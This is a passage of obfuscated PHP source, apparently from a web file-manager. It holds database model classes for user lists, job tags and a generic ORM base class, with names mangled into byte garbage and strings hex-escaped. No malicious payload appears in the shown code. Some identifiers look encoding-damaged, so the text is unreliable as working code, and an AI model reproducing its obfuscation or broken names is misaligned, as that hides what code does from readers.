USER_ID, $óÉ¨‡ÙÁ[557] => 0); $ùÏÄŒÜƒ = $this->where($¸¦ñÖÇ¤)->max($óÉ¨‡ÙÁ[1995]); if (!$ùÏÄŒÜƒ) { $ùÏÄŒÜƒ = 0; } if (!$½ÉÏ¤õ… && $åßÜ¯½Ì == $óÉ¨‡ÙÁ[490]) { $ô »ªÓ = Model($óÉ¨‡ÙÁ[1420])->where(array($óÉ¨‡ÙÁ[491] => $òÇ‡Ğïò))->find(); if (!$ô »ªÓ) { return !1; } $½ÉÏ¤õ… = $ô »ªÓ[$óÉ¨‡ÙÁ[32]]; } $½ÉÏ¤õ… = $this->getAutoName($½ÉÏ¤õ…); $¤—Óú®ú = array($óÉ¨‡ÙÁ[1763] => USER_ID, $óÉ¨‡ÙÁ[557] => 0, $óÉ¨‡ÙÁ[494] => $½ÉÏ¤õ…, $óÉ¨‡ÙÁ[495] => $òÇ‡Ğïò, $óÉ¨‡ÙÁ[496] => $åßÜ¯½Ì, $óÉ¨‡ÙÁ[1975] => $ùÏÄŒÜƒ + 1); return $this->add($¤—Óú®ú); } protected function remove($ÈœÔïºš) { $ÁóÒÊ¸› =& $_SERVER[¦»×‡Ãã]; $›‰õÅÇ = array($ÁóÒÊ¸›[1763] => USER_ID, $ÁóÒÊ¸›[493] => $ÈœÔïºš); return $this->where($›‰õÅÇ)->delete(); } protected function removeByName($Â°î¥—ó) { $üæà·˜ =& $_SERVER[¦»×‡Ãã]; $‰¯¦´„ = array($üæà·˜[1763] => USER_ID, $üæà·˜[494] => $Â°î¥—ó, $üæà·˜[557] => 0); return $this->where($‰¯¦´„)->delete(); } protected function rename($…Ìæœˆ¸, $’ªÃ„ª) { $‘ÁÊ£İÜ =& $_SERVER[¦»×‡Ãã]; if ($…Ìæœˆ¸ == $’ªÃ„ª) { return !1; } $ßƒ›¿³ê = $this->getAutoName($’ªÃ„ª); if ($’ªÃ„ª != $ßƒ›¿³ê) { return !1; } $ÍÖÏÚ­ó = array($‘ÁÊ£İÜ[1763] => USER_ID, $‘ÁÊ£İÜ[557] => 0, $‘ÁÊ£İÜ[32] => $…Ìæœˆ¸); return $this->where($ÍÖÏÚ­ó)->save(array($‘ÁÊ£İÜ[32] => $’ªÃ„ª)); } protected function resetSort($á‰ŞäŒ) { $ÕòŠ×¥© =& $_SERVER[¦»×‡Ãã]; $á‰ŞäŒ = is_array($á‰ŞäŒ) ? $á‰ŞäŒ : array(); $Ø‡„®Ñ¿ = array($ÕòŠ×¥©[1763] => USER_ID); for ($©ğ È = 0; $©ğ È < count($á‰ŞäŒ); $©ğ È++) { $Ø‡„®Ñ¿[$ÕòŠ×¥©[493]] = $á‰ŞäŒ[$©ğ È]; $this->where($Ø‡„®Ñ¿)->save(array($ÕòŠ×¥©[1975] => $©ğ È + 1)); } return !0; } protected function moveTop($ª¥ë¯˜ˆ) { $ëÑ…ñ—Ô =& $_SERVER[¦»×‡Ãã]; $ŸÉıÇ†„ = array($ëÑ…ñ—Ô[1763] => USER_ID, $ëÑ…ñ—Ô[557] => 0); $ú¼½ŞÁÉ = $this->where($ŸÉıÇ†„)->where(array($ëÑ…ñ—Ô[32] => $ª¥ë¯˜ˆ))->find(); if (!$ú¼½ŞÁÉ) { return; } $«Å‡Úˆ = $this->field($ëÑ…ñ—Ô[475])->where($ŸÉıÇ†„)->order($ëÑ…ñ—Ô[2449])->select(); $«Å‡Úˆ = array_to_keyvalue($«Å‡Úˆ, $ëÑ…ñ—Ô[12], $ëÑ…ñ—Ô[475]); $›½òÔ¢´ = $«Å‡Úˆ; $«Å‡Úˆ = array_remove_value($«Å‡Úˆ, $ú¼½ŞÁÉ[$ëÑ…ñ—Ô[475]]); array_unshift($«Å‡Úˆ, $ú¼½ŞÁÉ[$ëÑ…ñ—Ô[475]]); return $this->resetSort($«Å‡Úˆ); } protected function moveBottom($éÅã’ÖÂ) { $İÄŠ‹İË =& $_SERVER[¦»×‡Ãã]; $™Éô²àƒ = array($İÄŠ‹İË[1763] => USER_ID, $İÄŠ‹İË[557] => 0); $ûÂåÉ„Ö = $this->where($™Éô²àƒ)->max($İÄŠ‹İË[1995]); $…¿Ö‡Ìº = array($İÄŠ‹İË[1995] => $ûÂåÉ„Ö + 1); return $this->where($™Éô²àƒ)->where(array($İÄŠ‹İË[32] => $éÅã’ÖÂ))->save($…¿Ö‡Ìº); } private function getAutoName($•«åÄ’‘) { $¢ĞÓÎÁâ =& $_SERVER[¦»×‡Ãã]; $±¹ßƒ¹ = array($¢ĞÓÎÁâ[1763] => USER_ID, $¢ĞÓÎÁâ[557] => 0); $ÃÉ§­¥û = $this->field($¢ĞÓÎÁâ[32])->where($±¹ßƒ¹)->select(); $ÃÉ§­¥û = array_to_keyvalue($ÃÉ§­¥û, $¢ĞÓÎÁâ[12], $¢ĞÓÎÁâ[32]); if (!$ÃÉ§­¥û || !in_array($•«åÄ’‘, $ÃÉ§­¥û)) { return $•«åÄ’‘; } for ($»äÄ¤Ô = 0; $»äÄ¤Ô < count($ÃÉ§­¥û); $»äÄ¤Ô++) { if (!in_array($•«åÄ’‘ . "\50{$»äÄ¤Ô}\51", $ÃÉ§­¥û)) { return $•«åÄ’‘ . "\50{$»äÄ¤Ô}\51"; } } return $•«åÄ’‘ . "\50{$»äÄ¤Ô}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\x2e\152\x6f\142\x4c\151\163\164"; public $field = array("\x6e\141\155\145", "\144\145\163\x63", "\163\157\x72\x74"); const JOB_KEY = "\x73\145\x6c\x66\x4a\x6f\x62\x4c\151\163\x74"; public function listData($‰¾‡ÔÀ = false, $Ù•òÇ§è = "\163\157\x72\164", $ú™éÀ = false) { return parent::listData($‰¾‡ÔÀ, $Ù•òÇ§è, $ú™éÀ); } public function remove($õÍáıí) { return parent::remove($õÍáıí); } public function add($Ô ÃÑÌñ) { $œóà©ç• =& $_SERVER[¦»×‡Ãã]; if ($this->findByName($Ô ÃÑÌñ[$œóà©ç•[32]])) { return !1; } $Ô ÃÑÌñ[$œóà©ç•[1995]] = $this->getSort(); return parent::insert($Ô ÃÑÌñ); } private function getSort() { $½€à™íÇ =& $_SERVER[¦»×‡Ãã]; $Î³½¤Ú² = parent::listData(); $Øí•¹ß´ = array_to_keyvalue($Î³½¤Ú², $½€à™íÇ[12], $½€à™íÇ[1995]); return empty($Øí•¹ß´) ? 0 : max($Øí•¹ß´) + 1; } public function update($€Ñœç†¶, $Ç„¹áü€) { $ØˆœÛ» =& $_SERVER[¦»×‡Ãã]; $ˆŒ¥÷´ = parent::listData($€Ñœç†¶); $Ïß©â®à = $this->findByName($Ç„¹áü€[$ØˆœÛ»[32]]); if (!$ˆŒ¥÷´ || $Ïß©â®à && $Ïß©â®à[$ØˆœÛ»[475]] != $ˆŒ¥÷´[$ØˆœÛ»[475]]) { return !1; } return parent::update($€Ñœç†¶, $Ç„¹áü€); } public function setUserJob($ˆóœ‘ùÚ, $å„œ’æÉ) { $×€Ş¢ê =& $_SERVER[¦»×‡Ãã]; if (!is_array($å„œ’æÉ)) { $å„œ’æÉ = array($å„œ’æÉ); } $Ø²Øë´ = parent::listData(); $ï¸Á•¢½ = array_to_keyvalue($Ø²Øë´, $×€Ş¢ê[32]); $Ã«Æ¤‰• = $×€Ş¢ê[454]; foreach ($å„œ’æÉ as $İù­É±¸) { if ($ï¸Á•¢½[$İù­É±¸]) { $Ã«Æ¤‰• .= $ï¸Á•¢½[$İù­É±¸][$×€Ş¢ê[475]] . $×€Ş¢ê[50]; } else { $Î¯¡Íï  = $this->add($İù­É±¸); $Ã«Æ¤‰• .= $Î¯¡Íï  . $×€Ş¢ê[50]; } } $Ã«Æ¤‰• = rtrim($Ã«Æ¤‰•, $×€Ş¢ê[50]); Model($×€Ş¢ê[598])->metaSet($ˆóœ‘ùÚ, self::JOB_KEY, $Ã«Æ¤‰•); } public function getUserJob($™Î´Ä) { $¥›¢­ = Model($_SERVER[¦»×‡Ãã][598])->metaGet($™Î´Ä); return $this->getUserJobInfo($¥›¢­[self::JOB_KEY]); } public function getUserJobInfo($ºìöòÚ) { $ÕıíãÇÓ =& $_SERVER[¦»×‡Ãã]; $£‹Û«ÛÜ = explode($ÕıíãÇÓ[50], $ºìöòÚ); $óĞ‰ãÑ = parent::listData(); $óĞ‰ãÑ = array_remove_key($óĞ‰ãÑ, $ÕıíãÇÓ[231]); $ç•¨ö£ = array(); foreach ($£‹Û«ÛÜ as $ùŸÛÒêÀ) { if (isset($óĞ‰ãÑ[$ùŸÛÒêÀ])) { $ç•¨ö£[] = $óĞ‰ãÑ[$ùŸÛÒêÀ]; } } return $ç•¨ö£; } } goto aÅ £ÎÃæî; bÇµ¿¹ÕÚÒ: define($_SERVER[¦»×‡Ãã][320], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\142\154\145", "\x6f\162\144\145\x72", "\141\x6c\151\141\x73", "\150\x61\x76\151\x6e\147", "\147\162\x6f\165\160", "\x6c\x6f\143\x6b", "\x64\x69\163\x74\x69\156\143\x74", "\141\x75\x74\x6f", "\146\151\x6c\164\x65\162", "\x76\141\x6c\151\144\x61\164\145", "\162\x65\x73\x75\x6c\164", "\x62\151\x6e\x64", "\164\157\x6b\x65\x6e"); public function __construct($ã“ã€‘ = '', $™–˜Æª = '', $ó¥ÉÄ¼  = '') { $©À¼…µ„ =& $_SERVER[¦»×‡Ãã]; $this->_initialize(); if (!empty($ã“ã€‘)) { if (strpos($ã“ã€‘, $©À¼…µ„[10])) { list($this->dbName, $this->name) = explode($©À¼…µ„[10], $ã“ã€‘); } else { $this->name = $ã“ã€‘; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($™–˜Æª)) { $this->tablePrefix = $©À¼…µ„[12]; } elseif ($©À¼…µ„[12] != $™–˜Æª) { $this->tablePrefix = $™–˜Æª; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($©À¼…µ„[321]); } $this->db(0, empty($this->connection) ? $ó¥ÉÄ¼  : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $¼«Ì˜âÛ =& $_SERVER[¦»×‡Ãã]; if (empty($this->fields)) { if (think_config($¼«Ì˜âÛ[322])) { $š«ûø·ú = $this->dbName ? $this->dbName : think_config($¼«Ì˜âÛ[323]); $½æ¬ö•Ì = think_var_cache($¼«Ì˜âÛ[324] . strtolower(get_path_this($š«ûø·ú) . $¼«Ì˜âÛ[10] . $this->name)); if ($½æ¬ö•Ì) { $îÖ´ÛÌŠ = think_config($¼«Ì˜âÛ[325]); if (empty($îÖ´ÛÌŠ) || $½æ¬ö•Ì[$¼«Ì˜âÛ[326]] == $îÖ´ÛÌŠ) { $this->fields = $½æ¬ö•Ì; return; } } } $this->flush(); } } public function flush() { $»Äùí¿ =& $_SERVER[¦»×‡Ãã]; $this->db->setModel($this->name); $áÚñ¢Œ™ = $this->db->getFields($this->getTableName()); if (!$áÚñ¢Œ™) { return !1; } $this->fields = array_keys($áÚñ¢Œ™); $this->fields[$»Äùí¿[327]] = !1; foreach ($áÚñ¢Œ™ as $¸‡àÇ¼ => $î¡ßûÑ) { $‹¹İ‚Â[$¸‡àÇ¼] = $î¡ßûÑ[$»Äùí¿[33]]; if ($î¡ßûÑ[$»Äùí¿[39]]) { $this->fields[$»Äùí¿[328]] = $¸‡àÇ¼; if ($î¡ßûÑ[$»Äùí¿[42]]) { $this->fields[$»Äùí¿[327]] = !0; } } } $this->fields[$»Äùí¿[329]] = $‹¹İ‚Â; if (think_config($»Äùí¿[325])) { $this->fields[$»Äùí¿[326]] = think_config($»Äùí¿[325]); } if (think_config($»Äùí¿[322])) { $ç˜ãÓ¶Ö = $this->dbName ? $this->dbName : think_config($»Äùí¿[323]); think_var_cache($»Äùí¿[324] . strtolower(get_path_this($ç˜ãÓ¶Ö) . $»Äùí¿[10] . $this->name), $this->fields); } } public function switchModel($Ã­Ş„ù÷, $Åô¤”À‹ = array()) { $‹ÑÒÄ­½ =& $_SERVER[¦»×‡Ãã]; $å±Ì«º = ucwords(strtolower($Ã­Ş„ù÷)) . $‹ÑÒÄ­½[330]; if (!class_exists($å±Ì«º)) { think_exception($å±Ì«º . think_lang($‹ÑÒÄ­½[331])); } $this->_extModel = new $å±Ì«º($this->name); if (!empty($Åô¤”À‹)) { foreach ($Åô¤”À‹ as $¡áïùºÖ) { $this->_extModel->setProperty($¡áïùºÖ, $this->{$¡áïùºÖ}); } } return $this->_extModel; } public function __set($Ü”æ¥á‹, $òØè¿´) { $this->data[$Ü”æ¥á‹] = $òØè¿´; } public function __get($”ıüÍô°) { return isset($this->data[$”ıüÍô°]) ? $this->data[$”ıüÍô°] : null; } public function __isset($Ûïà·µÖ) { return isset($this->data[$Ûïà·µÖ]); } public function __unset($ª·¨„¼) { unset($this->data[$ª·¨„¼]); } public function __call($¹¹·„¢à, $œĞöÃĞù) { $û€ŞŸÕ¥ =& $_SERVER[¦»×‡Ãã]; if (in_array(strtolower($¹¹·„¢à), $this->methods, !0)) { $this->options[strtolower($¹¹·„¢à)] = $œĞöÃĞù[0]; return $this; } elseif (in_array(strtolower($¹¹·„¢à), array($û€ŞŸÕ¥[332], $û€ŞŸÕ¥[333], $û€ŞŸÕ¥[334], $û€ŞŸÕ¥[335], $û€ŞŸÕ¥[336]), !0)) { $•®ŠñÎÏ = isset($œĞöÃĞù[0]) ? $œĞöÃĞù[0] : $û€ŞŸÕ¥[220]; $•®ŠñÎÏ = $this->db->parseKey($•®ŠñÎÏ); return $this->getField(strtoupper($¹¹·„¢à) . $û€ŞŸÕ¥[337] . $•®ŠñÎÏ . $û€ŞŸÕ¥[338] . $¹¹·„¢à, $û€ŞŸÕ¥[332]); } elseif (strtolower(substr($¹¹·„¢à, 0, 5)) == $û€ŞŸÕ¥[339]) { $•®ŠñÎÏ = think_parse_name(substr($¹¹·„¢à, 5)); $´²ë½½[$•®ŠñÎÏ] = $œĞöÃĞù[0]; return $this->where($´²ë½½)->find(); } elseif (strtolower(substr($¹¹·„¢à, 0, 10)) == $û€ŞŸÕ¥[340]) { $ÃÈ¯´†± = think_parse_name(substr($¹¹·„¢à, 10)); $´²ë½½[$ÃÈ¯´†±] = $œĞöÃĞù[0]; return $this->where($´²ë½½)->getField($œĞöÃĞù[1]); } elseif (isset($this->_scope[$¹¹·„¢à])) { return $this->scope($¹¹·„¢à, $œĞöÃĞù[0]); } elseif (method_exists($this, $¹¹·„¢à)) { array_unshift($œĞöÃĞù, $¹¹·„¢à); return call_user_func_array(array($this, $û€ŞŸÕ¥[341]), $œĞöÃĞù); } else { return call_user_func_array(array(parent, $¹¹·„¢à), $œĞöÃĞù); } } protected function call() { $Å÷ãÜ =& $_SERVER[¦»×‡Ãã]; $Ò»–Ğ•› = func_get_args(); $ŸşÚÈÁÉ = array_shift($Ò»–Ğ•›); $«ø¥™©± = $ŸşÚÈÁÉ; if (is_array($ŸşÚÈÁÉ)) { $«ø¥™©± = $ŸşÚÈÁÉ[1]; $ŸşÚÈÁÉ = $ŸşÚÈÁÉ[0]; } $İ¢óÅªœ = count($Ò»–Ğ•›) - 1; if (isset($Ò»–Ğ•›[$İ¢óÅªœ]) && $Ò»–Ğ•›[$İ¢óÅªœ] === $ŸşÚÈÁÉ) { think_exception(__CLASS__ . $Å÷ãÜ[4] . $ŸşÚÈÁÉ . think_lang($Å÷ãÜ[342])); return; } $Ò»–Ğ•›[] = $ŸşÚÈÁÉ; if (method_exists($this, $Å÷ãÜ[343])) { $¢ù©¿à = call_user_func_array(array($this, $Å÷ãÜ[344]), array($«ø¥™©±, $Ò»–Ğ•›)); if (!is_null($¢ù©¿à) && $¢ù©¿à !== !1) { return $¢ù©¿à; } } $Ş¾ä…–ô = call_user_func_array(array($this, $ŸşÚÈÁÉ), $Ò»–Ğ•›); if (method_exists($this, $Å÷ãÜ[345])) { $¢ù©¿à = call_user_func_array(array($this, $Å÷ãÜ[346]), array($«ø¥™©±, $Ò»–Ğ•›, $Ş¾ä…–ô)); if ($¢ù©¿à) { return $¢ù©¿à; } } return $Ş¾ä…–ô; } protected function _initialize() { } protected function _facade($Ç„¢Ö¨Ü) { $şûº°ãí =& $_SERVER[¦»×‡Ãã]; if (!empty($this->fields)) { foreach ($Ç„¢Ö¨Ü as $ÕËîÄ  => $ˆşÓ®ğÙ) { if (is_array($this->fields) && !in_array($ÕËîÄ , $this->fields, !0)) { unset($Ç„¢Ö¨Ü[$ÕËîÄ ]); } elseif (is_scalar($ˆşÓ®ğÙ)) { $this->_parseType($Ç„¢Ö¨Ü, $ÕËîÄ ); } } } if (!empty($this->options[$şûº°ãí[347]])) { $Ç„¢Ö¨Ü = array_map($this->options[$şûº°ãí[347]], $Ç„¢Ö¨Ü); unset($this->options[$şûº°ãí[347]]); } $this->_beforeWrite($Ç„¢Ö¨Ü); return $Ç„¢Ö¨Ü; } protected function _beforeWrite(&$¨Åæöä¼) { } public function add($Á÷œô‡Â = '', $é€·’ÑÇ = array(), $í³ÖŠ £ = false) { if (empty($Á÷œô‡Â)) { if (!empty($this->data)) { $Á÷œô‡Â = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¦»×‡Ãã][348]); return !1; } } $é€·’ÑÇ = $this->_parseOptions($é€·’ÑÇ); $Á÷œô‡Â = $this->_facade($Á÷œô‡Â); if (!1 === $this->_beforeInsert($Á÷œô‡Â, $é€·’ÑÇ)) { return !1; } $ËÎ³×›Ğ = $this->db->insert($Á÷œô‡Â, $é€·’ÑÇ, $í³ÖŠ £); if (!1 !== $ËÎ³×›Ğ) { $ÜüÚÑ°ş = $this->getLastInsID(); if ($ÜüÚÑ°ş) { $Á÷œô‡Â[$this->getPk()] = $ÜüÚÑ°ş; $this->_after_insert($Á÷œô‡Â, $é€·’ÑÇ); return $ÜüÚÑ°ş; } $this->_after_insert($Á÷œô‡Â, $é€·’ÑÇ); } return $ËÎ³×›Ğ; } protected function _beforeInsert(&$ì·Şß, $Ô÷ Æ×¶) { } protected function _after_insert($§ñĞ·à, $¢ßÎö¿Ã) { } public function addAll($Ê¤Å·Åª, $ĞÑĞ£Ğù = array(), $ÆéÃ‚ = false) { $œÒò˜…Æ =& $_SERVER[¦»×‡Ãã]; if (empty($Ê¤Å·Åª)) { $this->error = think_lang($œÒò˜…Æ[348]); return !1; } $ĞÑĞ£Ğù = $this->_parseOptions($ĞÑĞ£Ğù); foreach ($Ê¤Å·Åª as $ÍÅê => $Ğğ—‘¡) { $Ê¤Å·Åª[$ÍÅê] = $this->_facade($Ğğ—‘¡); } if (method_exists($this->db, $œÒò˜…Æ[349])) { $Ã™€±Äš = $this->db->insertAll($Ê¤Å·Åª, $ĞÑĞ£Ğù, $ÆéÃ‚); } else { $this->startTrans(); foreach ($Ê¤Å·Åª as $ÍÅê => $Ğğ—‘¡) { $Ã™€±Äš = $this->db->insert($Ğğ—‘¡, $ĞÑĞ£Ğù, $ÆéÃ‚); } $this->commit(); } if (!1 !== $Ã™€±Äš) { $éÕõÕáõ = $this->getLastInsID(); if ($éÕõÕáõ) { return $éÕõÕáõ; } } return $Ã™€±Äš; } public function selectAdd($Ù½¼¹ªÌ = '', $ËÍ‰Ô¥¯ = '', $çîÍ¨² = array()) { $ÃÕ„Õ­Í =& $_SERVER[¦»×‡Ãã]; $çîÍ¨² = $this->_parseOptions($çîÍ¨²); if (!1 === ($û¥íÆØ¨ = $this->db->selectInsert($Ù½¼¹ªÌ ? $Ù½¼¹ªÌ : $çîÍ¨²[$ÃÕ„Õ­Í[350]], $ËÍ‰Ô¥¯ ? $ËÍ‰Ô¥¯ : $this->getTableName(), $çîÍ¨²))) { $this->error = think_lang($ÃÕ„Õ­Í[351]); return !1; } else { return $û¥íÆØ¨; } } public function save($ÇúïÜËÔ = '', $³‰Šéö = array()) { $ì…Á«¦Û =& $_SERVER[¦»×‡Ãã]; if (empty($ÇúïÜËÔ)) { if (!empty($this->data)) { $ÇúïÜËÔ = $this->data; $this->data = array(); } else { $this->error = think_lang($ì…Á«¦Û[348]); return !1; } } $ÇúïÜËÔ = $this->_facade($ÇúïÜËÔ); $³‰Šéö = $this->_parseOptions($³‰Šéö); $õÙ³ôö = $this->getPk(); if (!isset($³‰Šéö[$ì…Á«¦Û[352]])) { if (isset($ÇúïÜËÔ[$õÙ³ôö])) { $À—ºÂÀ§[$õÙ³ôö] = $ÇúïÜËÔ[$õÙ³ôö]; $³‰Šéö[$ì…Á«¦Û[352]] = $À—ºÂÀ§; unset($ÇúïÜËÔ[$õÙ³ôö]); } else { $this->error = think_lang($ì…Á«¦Û[351]); return !1; } } if (is_array($³‰Šéö[$ì…Á«¦Û[352]]) && isset($³‰Šéö[$ì…Á«¦Û[352]][$õÙ³ôö])) { $ĞĞ°Òùê = $³‰Šéö[$ì…Á«¦Û[352]][$õÙ³ôö]; } if (!1 === $this->_beforeUpdate($ÇúïÜËÔ, $³‰Šéö)) { return !1; } $û•Ï è = $this->db->update($ÇúïÜËÔ, $³‰Šéö); if (!1 !== $û•Ï è) { if (isset($ĞĞ°Òùê)) { $ÇúïÜËÔ[$õÙ³ôö] = $ĞĞ°Òùê; } $this->_afterUpdate($ÇúïÜËÔ, $³‰Šéö); } return $û•Ï è; } protected function _beforeUpdate(&$­é’‘ÒÎ, $Îó°µ´Ê) { } protected function _afterUpdate($í¿­é¡ó, $Åë’¿ÆĞ) { } public function delete($‰Ë¦¼İ = array()) { $¼ÄÎ¹¬ô =& $_SERVER[¦»×‡Ãã]; if (empty($‰Ë¦¼İ) && empty($this->options[$¼ÄÎ¹¬ô[352]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $“€Ëšó = $this->getPk(); if (is_numeric($‰Ë¦¼İ) || is_string($‰Ë¦¼İ)) { if (strpos($‰Ë¦¼İ, $¼ÄÎ¹¬ô[50])) { $ÖÑ½å«‘[$“€Ëšó] = array($¼ÄÎ¹¬ô[353], $‰Ë¦¼İ); } else { $ÖÑ½å«‘[$“€Ëšó] = $‰Ë¦¼İ; } $this->options[$¼ÄÎ¹¬ô[352]] = $ÖÑ½å«‘; } $‰Ë¦¼İ = $this->_parseOptions(); if (is_array($‰Ë¦¼İ[$¼ÄÎ¹¬ô[352]]) && isset($‰Ë¦¼İ[$¼ÄÎ¹¬ô[352]][$“€Ëšó])) { $¸†±à  = $‰Ë¦¼İ[$¼ÄÎ¹¬ô[352]][$“€Ëšó]; } $¹èÙ·¶¸ = $this->db->delete($‰Ë¦¼İ); if (!1 !== $¹èÙ·¶¸) { $†ÔÙœÑÓ = array(); if (isset($¸†±à )) { $†ÔÙœÑÓ[$“€Ëšó] = $¸†±à ; } $this->_after_delete($†ÔÙœÑÓ, $‰Ë¦¼İ); } return $¹èÙ·¶¸; } protected function _after_delete($üÒ’÷«‹, $÷åœ‘) { } public function select($¸ŸÎí®° = array()) { $ÌŞÖ¢ËÀ =& $_SERVER[¦»×‡Ãã]; if (is_string($¸ŸÎí®°) || is_numeric($¸ŸÎí®°)) { $¦¯Â¤˜ = $this->getPk(); if (strpos($¸ŸÎí®°, $ÌŞÖ¢ËÀ[50])) { $‰æºÓ×[$¦¯Â¤˜] = array($ÌŞÖ¢ËÀ[353], $¸ŸÎí®°); } else { $‰æºÓ×[$¦¯Â¤˜] = $¸ŸÎí®°; } $this->options[$ÌŞÖ¢ËÀ[352]] = $‰æºÓ×; } elseif (!1 === $¸ŸÎí®°) { $¸ŸÎí®° = $this->_parseOptions(); return $ÌŞÖ¢ËÀ[354] . $this->db->buildSelectSql($¸ŸÎí®°) . $ÌŞÖ¢ËÀ[355]; } $¸ŸÎí®° = $this->_parseOptions(); $º«õ™ˆİ = $this->db->select($¸ŸÎí®°); if (!1 === $º«õ™ˆİ) { return !1; } if (empty($º«õ™ˆİ)) { return null; } $this->_afterSelect($º«õ™ˆİ, $¸ŸÎí®°); return $º«õ™ˆİ; } protected function _afterSelect(&$¸ı•Œ’, $„Ñ‘¡ä…) { } public function buildSql($‡¿Èû¦œ = array()) { $ÕÑğÈùƒ =& $_SERVER[¦»×‡Ãã]; $‡¿Èû¦œ = $this->_parseOptions($‡¿Èû¦œ); return $ÕÑğÈùƒ[354] . $this->db->buildSelectSql($‡¿Èû¦œ) . $ÕÑğÈùƒ[355]; } public function optionsValue($”ªï„î = null) { if (is_null($”ªï„î)) { return $this->options; } elseif (is_array($”ªï„î)) { $this->options = array_merge($this->options, $”ªï„î); } } protected function _parseOptions($…·Ó§¶™ = array()) { $Ö’‘™Ö =& $_SERVER[¦»×‡Ãã]; if (is_array($…·Ó§¶™)) { $…·Ó§¶™ = array_merge($this->options, $…·Ó§¶™); } $this->options = array(); if (!isset($…·Ó§¶™[$Ö’‘™Ö[356]])) { $…·Ó§¶™[$Ö’‘™Ö[356]] = $this->getTableName(); $ÉÏ÷Óäõ = $this->fields; } else { $ÉÏ÷Óäõ = $this->getDbFields(); } if (!empty($…·Ó§¶™[$Ö’‘™Ö[357]])) { $…·Ó§¶™[$Ö’‘™Ö[356]] .= $Ö’‘™Ö[53] . $…·Ó§¶™[$Ö’‘™Ö[357]]; } $…·Ó§¶™[$Ö’‘™Ö[358]] = $this->name; if (isset($…·Ó§¶™[$Ö’‘™Ö[352]]) && is_array($…·Ó§¶™[$Ö’‘™Ö[352]]) && !empty($ÉÏ÷Óäõ) && !isset($…·Ó§¶™[$Ö’‘™Ö[359]]) && !isset($…·Ó§¶™[$Ö’‘™Ö[356]])) { foreach ($…·Ó§¶™[$Ö’‘™Ö[352]] as $ùªÛÕ¼â => $É«ú¾ïÓ) { $ùªÛÕ¼â = trim($ùªÛÕ¼â); if (in_array($ùªÛÕ¼â, $ÉÏ÷Óäõ, !0)) { if (is_scalar($É«ú¾ïÓ)) { $this->_parseType($…·Ó§¶™[$Ö’‘™Ö[352]], $ùªÛÕ¼â); } } elseif (!is_numeric($ùªÛÕ¼â) && $Ö’‘™Ö[11] != substr($ùªÛÕ¼â, 0, 1) && !1 === strpos($ùªÛÕ¼â, $Ö’‘™Ö[10]) && !1 === strpos($ùªÛÕ¼â, $Ö’‘™Ö[337]) && !1 === strpos($ùªÛÕ¼â, $Ö’‘™Ö[214]) && !1 === strpos($ùªÛÕ¼â, $Ö’‘™Ö[360])) { unset($…·Ó§¶™[$Ö’‘™Ö[352]][$ùªÛÕ¼â]); } } } $this->_options_filter($…·Ó§¶™); return $…·Ó§¶™; } protected function _options_filter(&$ğòÖí¶Œ) { } protected function _parseType(&$ÚĞ²¾Œä, $·¥€¿šÏ) { $™–¼Ó–é =& $_SERVER[¦»×‡Ãã]; if (empty($this->options[$™–¼Ó–é[361]][$™–¼Ó–é[4] . $·¥€¿šÏ])) { $â¢Á‹øµ = strtolower($this->fields[$™–¼Ó–é[329]][$·¥€¿šÏ]); if (!1 !== strpos($â¢Á‹øµ, $™–¼Ó–é[362])) { } elseif (!1 === strpos($â¢Á‹øµ, $™–¼Ó–é[363]) && !1 !== strpos($â¢Á‹øµ, $™–¼Ó–é[364])) { $ÚĞ²¾Œä[$·¥€¿šÏ] = intval($ÚĞ²¾Œä[$·¥€¿šÏ]); } elseif (!1 !== strpos($â¢Á‹øµ, $™–¼Ó–é[365]) || !1 !== strpos($â¢Á‹øµ, $™–¼Ó–é[366])) { $ÚĞ²¾Œä[$·¥€¿šÏ] = floatval($ÚĞ²¾Œä[$·¥€¿šÏ]); } elseif (!1 !== strpos($â¢Á‹øµ, $™–¼Ó–é[367])) { $ÚĞ²¾Œä[$·¥€¿šÏ] = (bool) $ÚĞ²¾Œä[$·¥€¿šÏ]; } } } public function find($Ôà„ñó = array()) { $ÚÉ…£„ô =& $_SERVER[¦»×‡Ãã]; if (is_numeric($Ôà„ñó) || is_string($Ôà„ñó)) { $“şÎ‡Ã¨[$this->getPk()] = intval($Ôà„ñó); $this->options[$ÚÉ…£„ô[352]] = $“şÎ‡Ã¨; } $this->options[$ÚÉ…£„ô[368]] = 1; $Ôà„ñó = $this->_parseOptions(); $»´ôì«´ = $this->db->select($Ôà„ñó); if (!1 === $»´ôì«´) { return !1; } if (empty($»´ôì«´)) { return null; } $this->data = $»´ôì«´[0]; $this->_afterFind($this->data, $Ôà„ñó); if (!empty($this->options[$ÚÉ…£„ô[369]])) { return $this->returnResult($this->data, $this->options[$ÚÉ…£„ô[369]]); } return $this->data; } protected function _afterFind(&$İÂÉ£ìÏ, $ÅïÏØÎá) { } protected function returnResult($ß‚ûÊíğ, $è“…òœë = '') { $®Áç´…Ï =& $_SERVER[¦»×‡Ãã]; if ($è“…òœë) { if (is_callable($è“…òœë)) { return call_user_func($è“…òœë, $ß‚ûÊíğ); } switch (strtolower($è“…òœë)) { case $®Áç´…Ï[370]: return json_encode($ß‚ûÊíğ); case $®Áç´…Ï[371]: return xml_encode($ß‚ûÊíğ); } } return $ß‚ûÊíğ; } public function parseFieldsMap($ÅïåÅ‡©, $ğä€«Îó = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ìÛ¹Ô–¯ => $¤÷Ü…) { if ($ğä€«Îó == 1) { if (isset($ÅïåÅ‡©[$¤÷Ü…])) { $ÅïåÅ‡©[$ìÛ¹Ô–¯] = $ÅïåÅ‡©[$¤÷Ü…]; unset($ÅïåÅ‡©[$¤÷Ü…]); } } else { if 